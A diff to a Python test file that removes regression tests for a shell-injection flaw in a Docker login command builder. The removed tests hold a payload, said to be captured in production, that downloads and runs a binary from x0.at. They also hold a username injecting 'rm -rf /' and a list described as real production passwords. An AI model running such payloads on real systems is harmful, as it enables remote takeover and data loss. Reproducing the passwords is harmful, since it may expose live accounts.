@@ -1,4 +1,3 @@
-import shlex
 from unittest.mock import AsyncMock, Mock, MagicMock, patch
 from uuid import uuid4, UUID
 from datetime import datetime
@@ -2154,64 +2153,6 @@ async def test_clean_containers_no_volume_cleanup_when_disabled(docker_service, 
     # Assert — only one call for container rm, no volume command
     assert retry_ssh_mock.call_count == 1
     assert "docker rm" in retry_ssh_mock.call_args_list[0][0][1]
-
-
-# DAH-2009: shell-injection RCE via docker_password — verify _build_docker_login_command
-# wraps credentials with shlex.quote so attacker payloads stay literal arguments to echo.
-
-
-def test_build_docker_login_command_neutralizes_attack_payload_in_password():
-    """The 2026-04-27 RCE payload must end up as a single argument to echo, not as injected commands."""
-    # Arrange — exact payload captured in production
-    malicious_password = (
-        "x' | curl https://x0.at/mney -o /tmp/mney"
-        "&&chmod +x /tmp/mney && /tmp/mney   |echo '"
-    )
-
-    # Act
-    command = DockerService._build_docker_login_command("user", malicious_password)
-    tokens = shlex.split(command)
-
-    # Assert — the entire payload is one token after `echo`, so the shell
-    # never reaches `curl`/`chmod`/`/tmp/mney` as commands.
-    assert tokens[0] == "echo"
-    assert tokens[1] == malicious_password
-    assert tokens[2] == "|"
-    assert tokens[3] == "/usr/bin/docker"
-    assert tokens[4] == "login"
-    assert tokens[5] == "--username"
-    assert tokens[6] == "user"
-    assert tokens[7] == "--password-stdin"
-
-
-def test_build_docker_login_command_preserves_legitimate_password_with_metachars():
-    """Strong real-world passwords containing &, $, ', ` must round-trip unchanged."""
-    # Arrange — sample of in-production legitimate passwords
-    legit_passwords = [
-        "cJhMt$8^?jc)n8&",
-        "Grande@Cor#Hube&Pasa307",
-        "dcb&L#%iJh^c@DXHNJommE@94$!Qk!9n",
-        "k!&2Ruz3jnbQ@EcB42bU",
-    ]
-
-    # Act + Assert — each password becomes exactly one shell token to echo.
-    for password in legit_passwords:
-        command = DockerService._build_docker_login_command("user", password)
-        tokens = shlex.split(command)
-        assert tokens[1] == password, f"password mangled: {password!r} → {tokens[1]!r}"
-
-
-def test_build_docker_login_command_quotes_username_too():
-    """docker_username is also injected via f-string — must be quoted."""
-    # Arrange — username carrying shell metacharacters
-    malicious_username = "user'; rm -rf / #"
-
-    # Act
-    command = DockerService._build_docker_login_command(malicious_username, "pw")
-    tokens = shlex.split(command)
-
-    # Assert — the entire username appears as one token after --username.
-    assert tokens[6] == malicious_username
 
 
 def test_local_volume_timeout_stays_default_for_small_or_unlimited_volumes():
